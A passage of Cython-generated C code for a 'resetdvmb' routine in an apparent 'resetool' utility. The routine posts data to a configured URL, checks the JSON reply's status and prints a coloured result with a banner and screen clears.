  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_data = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_post); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_url); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = PyTuple_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GIVEREF(__pyx_t_1);
      PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_1);
      __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_headers); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_t_4) < 0) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 67, __pyx_L3_error)
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_v_response = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_2)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_2);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_4 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_v_json_resp = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_json_resp, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = PyList_New(6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_int_115);
      __Pyx_GIVEREF(__pyx_int_115);
      PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_115);
      __Pyx_INCREF(__pyx_int_116);
      __Pyx_GIVEREF(__pyx_int_116);
      PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_116);
      __Pyx_INCREF(__pyx_int_97);
      __Pyx_GIVEREF(__pyx_int_97);
      PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_97);
      __Pyx_INCREF(__pyx_int_116);
      __Pyx_GIVEREF(__pyx_int_116);
      PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_116);
      __Pyx_INCREF(__pyx_int_117);
      __Pyx_GIVEREF(__pyx_int_117);
      PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_117);
      __Pyx_INCREF(__pyx_int_115);
      __Pyx_GIVEREF(__pyx_int_115);
      PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_115);
      __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_INCREF(__pyx_int_111);
      __Pyx_GIVEREF(__pyx_int_111);
      PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_111);
      __Pyx_INCREF(__pyx_int_107);
      __Pyx_GIVEREF(__pyx_int_107);
      PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_107);
      __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = PyObject_RichCompare(__pyx_t_4, __pyx_t_1, Py_EQ); __Pyx_XGOTREF(__pyx_t_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (__pyx_t_8) {

        
        __pyx_t_2 = PyTuple_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 70, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_9 = 0;
        __pyx_t_10 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_refresh); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 70, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 70, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_10;
        __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_1_909m);
        __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
        __pyx_t_9 += 21;
        __Pyx_GIVEREF(__pyx_kp_u_1_909m);
        PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_1_909m);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_green); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 70, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 70, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_10;
        __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
        __Pyx_GIVEREF(__pyx_t_1);
        PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_t_1);
        __pyx_t_1 = 0;
        __Pyx_INCREF(__pyx_kp_u__3);
        __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
        __pyx_t_9 += 23;
        __Pyx_GIVEREF(__pyx_kp_u__3);
        PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_kp_u__3);
        __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_2, 4, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 70, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_v_status_text = ((PyObject*)__pyx_t_1);
        __pyx_t_1 = 0;

        
        goto __pyx_L9;
      }

      
      /*else*/ {
        __pyx_t_1 = PyTuple_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 72, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_9 = 0;
        __pyx_t_10 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_refresh); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 72, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 72, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_10;
        __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_1_909m);
        __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
        __pyx_t_9 += 21;
        __Pyx_GIVEREF(__pyx_kp_u_1_909m);
        PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u_1_909m);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_red); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 72, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 72, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_10;
        __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
        __Pyx_GIVEREF(__pyx_t_2);
        PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_t_2);
        __pyx_t_2 = 0;
        __Pyx_INCREF(__pyx_kp_u__4);
        __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
        __pyx_t_9 += 41;
        __Pyx_GIVEREF(__pyx_kp_u__4);
        PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_kp_u__4);
        __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_1, 4, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 72, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_v_status_text = ((PyObject*)__pyx_t_2);
        __pyx_t_2 = 0;
      }
      __pyx_L9:;

      
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;

    
    __pyx_t_11 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_11) {
      __Pyx_AddTraceback("source.resetool.resetdvmb", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_4) < 0) __PYX_ERR(0, 73, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_1);
      __pyx_v_e = __pyx_t_1;
      /*try:*/ {

        
        __pyx_t_3 = PyTuple_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_9 = 0;
        __pyx_t_10 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_refresh); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 74, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_13 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 74, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_13) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_13) : __pyx_t_10;
        __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_13);
        __Pyx_GIVEREF(__pyx_t_13);
        PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_13);
        __pyx_t_13 = 0;
        __Pyx_INCREF(__pyx_kp_u_1_909m);
        __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
        __pyx_t_9 += 21;
        __Pyx_GIVEREF(__pyx_kp_u_1_909m);
        PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_kp_u_1_909m);
        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_red); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 74, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_13, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 74, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_10;
        __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
        __Pyx_GIVEREF(__pyx_t_12);
        PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_t_12);
        __pyx_t_12 = 0;
        __Pyx_INCREF(__pyx_kp_u__4);
        __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
        __pyx_t_9 += 41;
        __Pyx_GIVEREF(__pyx_kp_u__4);
        PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_kp_u__4);
        __pyx_t_12 = __Pyx_PyUnicode_Join(__pyx_t_3, 4, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 74, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF_SET(__pyx_v_status_text, ((PyObject*)__pyx_t_12));
        __pyx_t_12 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L16;
        }
        __pyx_L15_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0; __pyx_t_21 = 0;
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_19, &__pyx_t_20, &__pyx_t_21);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18) < 0)) __Pyx_ErrFetch(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_19);
          __Pyx_XGOTREF(__pyx_t_20);
          __Pyx_XGOTREF(__pyx_t_21);
          __pyx_t_11 = __pyx_lineno; __pyx_t_14 = __pyx_clineno; __pyx_t_15 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_19);
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_XGIVEREF(__pyx_t_21);
            __Pyx_ExceptionReset(__pyx_t_19, __pyx_t_20, __pyx_t_21);
          }
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_18);
          __Pyx_ErrRestore(__pyx_t_16, __pyx_t_17, __pyx_t_18);
          __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0; __pyx_t_21 = 0;
          __pyx_lineno = __pyx_t_11; __pyx_clineno = __pyx_t_14; __pyx_filename = __pyx_t_15;
          goto __pyx_L5_except_error;
        }
        __pyx_L16:;
      }
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    __pyx_L8_try_end:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_clear_screen); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_4 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_banner); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 77, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_4 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 77, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_v_status_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 79, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_refresh); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 81, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 81, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_t_1, __pyx_kp_u_1_909m_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 81, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_sleep); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_2, __pyx_int_5) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_int_5);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_clear_screen); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 85, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 85, __pyx_L1_error)
